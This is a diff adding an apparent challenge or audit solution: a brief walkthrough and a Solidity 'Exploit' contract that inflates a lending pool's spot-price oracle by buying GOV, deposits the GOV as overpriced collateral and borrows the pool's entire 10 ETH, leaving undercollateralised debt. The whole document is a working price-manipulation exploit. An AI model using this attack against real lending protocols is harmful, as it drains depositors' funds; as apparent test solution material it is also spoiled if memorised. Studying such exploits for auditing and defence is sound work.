@@ -1,0 +1,34 @@
+The exchange price is a spot price read from the pool's own reserves, and `borrow` uses it to value collateral. A single large buy of GOV can therefore inflate that price within one transaction.
+
+1. Buy GOV with the full 10 ETH. This moves the reserves to about 20 ETH and 5007.5 GOV, so the spot price rises to about 0.004 ETH per GOV, roughly 4x the launch price.
+2. Deposit the roughly 4992 GOV received as collateral. At the inflated price `maxBorrow` is about 14.95 ETH.
+3. Borrow 10 ETH, which is the pool's full supplied liquidity and passes both the liquidity check and the health check.
+4. The invariant now fails: the collateral is worth about 4.99 ETH at the fair price of 0.001, against 10 ETH of debt.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface ILendPool {
+    function buyGov() external payable;
+    function depositCollateral(uint amount) external;
+    function borrow(uint amount) external;
+    function govOf(address) external view returns (uint);
+}
+
+contract Exploit {
+    ILendPool public pool;
+
+    constructor(address target) payable {
+        pool = ILendPool(target);
+    }
+
+    function run() external {
+        pool.buyGov{value: 10 ether}();
+        pool.depositCollateral(pool.govOf(address(this)));
+        pool.borrow(10 ether);
+    }
+
+    receive() external payable {}
+}
+```
